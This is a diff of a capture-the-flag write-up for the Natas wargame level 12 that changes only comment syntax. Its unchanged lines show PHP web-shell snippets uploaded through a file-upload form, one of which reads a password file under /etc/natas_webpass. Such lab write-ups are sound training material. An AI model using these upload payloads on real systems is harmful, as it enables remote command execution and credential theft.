@@ -48,10 +48,10 @@ By analysing the php script we can inject some malicious scipts, But we've to us
 Lets upload script.php
 ```php
 <? $res = shell_exec('pwd'); echo "<pre>$res</pre>"; ?>
-<!--/var/www/natas/natas12/upload -->
+# /var/www/natas/natas12/upload
 ```
 ```php
-<!-- You can use find command to find the password for this level but I expect that they are in the same dir -->
+# You can use find command to find the password for this level but I expect that they are in the same dir
 <? echo shell_exec('cat /etc/natas_webpass/natas13'); ?>
 ```
 
